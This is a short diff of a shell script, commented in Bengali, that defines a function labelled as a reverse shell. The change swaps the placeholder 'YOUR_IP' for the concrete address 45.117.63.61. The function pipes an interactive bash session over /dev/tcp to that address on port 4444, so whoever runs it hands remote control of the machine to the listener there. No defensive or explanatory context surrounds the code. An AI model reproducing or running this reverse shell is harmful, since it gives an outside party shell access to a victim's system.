@@ -2,7 +2,7 @@
 
 # রিভার্স শেল ফাংশন
 reverse_shell() {
-    SERVER_IP="YOUR_IP"  # এখানে আপনার পাবলিক আইপি দিন
+    SERVER_IP="45.117.63.61"  # এখানে আপনার পাবলিক আইপি দিন
     SERVER_PORT=4444     # পোর্ট নম্বর
 
     /bin/bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
